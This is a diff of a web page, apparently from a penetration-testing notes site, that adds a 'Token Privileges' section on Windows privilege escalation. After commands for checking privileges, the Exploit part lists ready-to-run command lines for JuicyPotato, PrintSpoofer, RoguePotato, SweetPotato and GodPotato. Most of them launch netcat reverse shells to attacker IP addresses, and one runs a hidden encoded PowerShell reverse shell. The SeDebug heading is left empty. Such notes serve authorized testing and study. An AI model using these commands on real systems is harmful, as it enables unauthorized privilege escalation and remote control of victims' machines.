@@ -99,6 +99,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#identify" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -3477,6 +3482,19 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Token Privileges
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -3488,6 +3506,65 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#seimpersonate-seassignprimarytoken" class="md-nav__link">
+    <span class="md-ellipsis">
+      SeImpersonate &amp; SeAssignPrimaryToken
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sedebug" class="md-nav__link">
+    <span class="md-ellipsis">
+      SeDebug
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -3665,6 +3742,56 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#seimpersonate-seassignprimarytoken" class="md-nav__link">
+    <span class="md-ellipsis">
+      SeImpersonate &amp; SeAssignPrimaryToken
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sedebug" class="md-nav__link">
+    <span class="md-ellipsis">
+      SeDebug
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -3684,7 +3811,44 @@
 
   <h1>Token Privileges</h1>
 
-
+<h2 id="identify">identify</h2>
+<hr />
+<p><div class="language-batch highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>whoami /priv
+</span></code></pre></div>
+Or sysinternals</p>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span>
+</span></code></pre></div></p>
+<h2 id="exploit">Exploit</h2>
+<hr />
+<h4 id="seimpersonate-seassignprimarytoken">SeImpersonate &amp; SeAssignPrimaryToken</h4>
+<p>Windows Server 2016 and under: 
+<strong>JuicyPotato</strong> <a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c c:\tools\nc.exe 10.10.15.119 5555 -e cmd.exe&quot; -t *
+</span></code></pre></div>
+Windows Server 2019 and on:
+<strong>PrintSpoofer</strong>: <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a>
+Spawn shell over new process <em>need stable shell</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>PrintSpoofer.exe -i -c cmd.exe
+</span></code></pre></div>
+Spawn revshell
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>PrintSpoofer.exe -c &quot;c:\tools\nc.exe 10.10.14.3 8443 -e cmd&quot;
+</span></code></pre></div>
+<strong>RoguePotato:</strong> <a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>RoguePotato.exe -r &lt;IP&gt; -e &quot;C:\Windows\Tasks\nc.exe &lt;IP&gt; &lt;port&gt; -e cmd.exe&quot; -l 9999
+</span></code></pre></div>
+<strong>SweetPotato</strong>: <a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a &quot;-w hidden -enc &lt;ENCODED REVSHELL&gt;&quot;
+</span></code></pre></div>
+OR
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a &quot;10.10.10.10 1234 -e cmd&quot;
+</span></code></pre></div>
+<strong>GodPotato</strong>: <a href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>GodPotato.exe -cmd &quot;cmd /c whoami&quot;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>GodPotato -cmd &quot;nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012&quot;
+</span></code></pre></div></p>
+<h4 id="sedebug">SeDebug</h4>
 
 
 
